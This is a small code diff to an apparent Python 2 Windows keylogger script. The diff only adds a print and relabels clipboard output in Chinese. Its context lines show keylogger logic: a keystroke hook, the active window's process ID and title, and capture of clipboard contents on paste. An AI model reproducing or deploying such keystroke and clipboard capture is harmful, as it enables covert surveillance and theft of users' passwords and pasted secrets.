@@ -31,7 +31,8 @@ def get_current_process():
     length = user32.GetWindowTextA(hwnd,byref(window_title),512)
 
     window_title1 = win32gui.GetWindowText(hwnd)
-
+    
+    print
     print "[PID: %s - %s - %s]" % (process_id,executable.value,window_title.value)
     ##print window_title1
     ##ls.append(hwnd)
@@ -57,7 +58,7 @@ def keystroke(event):
             pasted_value = win32clipboard.GetClipboardData()
             win32clipboard.CloseClipboard()
 
-            print "[PASTE] - %s" % (pasted_value),
+            print u"[粘贴板] - %s" % (pasted_value),
         else:
             print "[%s]" % event.Key,
 
